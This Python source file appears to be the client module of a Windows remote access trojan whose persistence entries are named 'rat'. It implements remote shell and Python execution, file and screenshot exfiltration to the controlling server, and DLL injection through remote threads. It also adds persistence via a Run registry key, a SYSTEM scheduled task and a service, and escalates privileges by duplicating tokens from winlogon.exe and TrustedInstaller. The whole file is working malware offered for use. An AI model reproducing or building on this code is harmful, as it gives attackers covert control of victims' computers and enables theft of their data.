import contextlib
import inspect
import io
import locale
import subprocess
import winreg
from functools import wraps

from client.util import *
from common.util import parse_args, parse

if os.name == 'nt':
    from client.win32util import *

INTEGRITY_LEVEL = get_integrity_level()
EXECUTABLE_PATH = get_executable_path()
APPNAME_AND_CMDLINE = get_appname_and_cmdline()


def desc(text: str):
    """
    为被添加注解的函数设置命令帮助
    """

    def attr_decorator(func):
        setattr(func, 'help', text)
        return func

    return attr_decorator


def params(arg_list: list):
    """
    为被添加注解的函数设置参数属性
    """

    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # 解析函数参数获得参数字典
            arg_dict = parse_args(arg_list, args[0])
            # 遍历参数字典
            for key in arg_dict:
                # 为函数设置属性
                setattr(func, key, arg_dict[key])
            # 将对函数自身的引用添加到函数的第一个参数
            return func(func, *args, **kwargs)

        # 保留函数原始参数
        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def require_admin(func):
    """
    被添加注解的函数执行前需要检查管理员权限
    """

    def wrapper(*args):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return func(*args)
        else:
            return 0, 'Operation requires elevation'

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


def require_integrity(integrity_level: str):
    """
    被添加注解的函数执行前需要检查是否有相应权限
    """

    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args):
            if INTEGRITY_LEVEL == integrity_level:
                return func(*args)
            else:
                return 0, '{} integrity level required'.format(integrity_level)

        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def enclosing(func):
    def wrapper(*args):
        # 定义函数
        func(func, *args)
        # 获取函数参数
        args = args[0]
        # 获取函数内的嵌套函数
        nested_funcs = getattr(func, 'nested_funcs')
        # 如果函数没有传入参数，返回嵌套函数列表
        if not args:
            commands = {}
            for name in [nested for nested in nested_funcs]:
                nested = nested_funcs[name]
                if hasattr(nested, 'help'):
                    commands[name] = nested.help
            return 1, format_dict(commands)
        # 将函数参数拆分为嵌套函数名和其他参数
        name, arg = parse(args)
        if name in nested_funcs and callable(nested_funcs[name]):
            # 获取嵌套函数
            nested = nested_funcs[name]
            # 获取嵌套函数的参数
            args = inspect.getfullargspec(nested).args
            # 获取嵌套函数的参数个数
            argc = len(args)
            # 如果嵌套函数需要参数
            if argc:
                # 将参数传入嵌套函数执行返回结果
                return nested(arg)
            # 如果嵌套函数不需要参数
            else:
                # 执行嵌套函数并返回结果
                return nested()
        else:
            return 0, 'Invalid command: {}'.format(name)

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


class Command:

    @staticmethod
    @desc('show this help')
    def help():
        """
        显示帮助菜单
        """
        method_list = [method for method in dir(Command) if not method.startswith('__')]
        commands = {}
        for method_name in method_list:
            method = getattr(Command, method_name)
            if hasattr(method, 'help'):
                commands[method_name] = method.help
        return 1, format_dict(commands)

    @staticmethod
    @desc('change directory')
    def cd(path):
        """
        切换目录
        """
        if not path:
            return 1, ''
        if os.path.isdir(path):
            os.chdir(path)
            return 1, ''
        else:
            return 0, 'Cannot find the path specified'

    @staticmethod
    @desc('execute shell command')
    def shell(command):
        """
        执行shell命令
        """
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
        if stdout:
            return 1, stdout
        elif stderr:
            return 0, stderr
        else:
            return 1, ''

    @staticmethod
    def noreturn(command):
        if not command:
            return 0, ''
        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return 1, 'Process created: {}'.format(p.pid)

    @staticmethod
    @desc('download file')
    def download(server, filename):
        """
        给服务端发送文件
        """
        if os.path.isfile(filename):
            server.send_file(filename)
        else:
            server.send_result(0, 'File does not exist')

    @staticmethod
    @desc('inject DLL into process')
    @params(['pid', 'dll_path'])
    def inject(this, args):
        """
        远程线程注入
        """
        if not os.path.isfile(this.dll_path):
            return 0, 'File does not exist: {}'.format(this.dll_path)
        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))

    @staticmethod
    @desc('execute python code')
    def pyexec(code, args: dict = None):
        """
        执行Python代码
        """
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, args)
        return 1, f.getvalue()

    @staticmethod
    @desc('grab a screenshot')
    def screenshot(server):
        """
        截图
        """
        import pyautogui
        filename = 'screenshot_{}.png'.format(get_time())
        pyautogui.screenshot(filename)
        server.send_file(filename)

    @staticmethod
    @desc('get information')
    def getinfo():
        """
        获取客户端信息
        """
        import psutil
        import platform
        info = {}
        try:
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['username'] = psutil.Process().username()
            info['intgty_lvl'] = INTEGRITY_LEVEL
            info['exec_path'] = EXECUTABLE_PATH
        except:
            pass
        finally:
            return 1, format_dict(info)

    @staticmethod
    @desc('ask for uac elevation')
    def askuac():
        """
        请求权限提升
        """
        import win32api
        if not ctypes.windll.shell32.IsUserAnAdmin():
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', *APPNAME_AND_CMDLINE, None, 1)
            if result > 32:
                return 1, ''
            else:
                return 0, str(result) + ', ' + win32api.FormatMessage(result)
        else:
            return 0, ''

    @staticmethod
    @desc('detect user inactive time')
    def idletime():
        """
        获取用户闲置时间
        """
        import win32api
        return 1, 'User has been idle for: {} seconds'.format(
            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)

    @staticmethod
    @desc('apply persistence mechanism')
    @enclosing
    def persistence(this, arg):
        """
        添加启动项
        """

        @desc('create registry key')
        def registry(option):
            if not option:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.CloseKey(key)
                return 1, 'Registry key created'
            elif option == '--undo':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.DeleteValue(key, 'rat')
                winreg.CloseKey(key)
                return 1, 'Registry key removed'
            else:
                return 0, 'Unknown option: {}'.format(option)

        @desc('schedule task')
        @require_admin
        def schtasks(option):
            if not option:
                return Command.shell(
                    'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{}" /f'.format(
                        EXECUTABLE_PATH))
            elif option == '--undo':
                return Command.shell('schtasks.exe /delete /tn rat /f')
            else:
                return 0, 'Unknown option: {}'.format(option)

        @desc('create service')
        @require_admin
        def service(option):
            if not option:
                return Command.shell('sc create rat binpath="{}" start= auto'.format(EXECUTABLE_PATH))
            elif option == '--undo':
                return Command.shell('sc delete rat')
            else:
                return 0, 'Unknown option: {}'.format(option)

        this.nested_funcs = locals()

    @staticmethod
    @desc('duplicate token from process')
    @enclosing
    def stealtoken(this, arg):

        @desc('run as system')
        @require_admin
        def system():
            enable_privilege('SeDebugPrivilege')
            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
                                            APPNAME_AND_CMDLINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as trusted installer')
        @require_admin
        def ti():
            enable_privilege('SeDebugPrivilege')
            start_service('TrustedInstaller')
            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
            pid = create_process_with_token(h_token, APPNAME_AND_CMDLINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as user (break through session 0 isolation)')
        @require_integrity('System')
        def user():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_user_token())
            pid = create_process_as_user(h_token, APPNAME_AND_CMDLINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as admin (break through session 0 isolation)')
        @require_integrity('System')
        def admin():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_linked_token(get_user_token()))
            pid = create_process_as_user(h_token, APPNAME_AND_CMDLINE)
            return 1, 'Process created: {}'.format(pid)

        this.nested_funcs = locals()
